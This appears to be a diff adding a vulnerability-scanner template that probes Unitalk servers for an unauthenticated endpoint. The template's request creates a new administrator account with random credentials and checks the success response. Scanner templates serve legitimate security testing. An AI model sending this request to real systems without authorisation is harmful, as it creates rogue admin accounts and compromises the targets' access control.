@@ -1,0 +1,38 @@
+id: poc-yaml-unitalk-add-anyuser-add
+info:
+  name: unitalk add 任意用户添加漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control
+
+variables:
+  user: '{{rand_text_alphanumeric(5)}}'
+  passwd: '{{rand_text_alphanumeric(8)}}'
+
+http:
+  - raw:
+      - |
+        POST /unitalk/v1.0/user/add.json HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"name":"{{user}}","role":"admin","pwd":"{{passwd}}","token":""}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "新增用户成功"
+          - "\"Response\":"
+      - type: regex
+        part: header
+        regex:
+          - "(?i)application/json"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
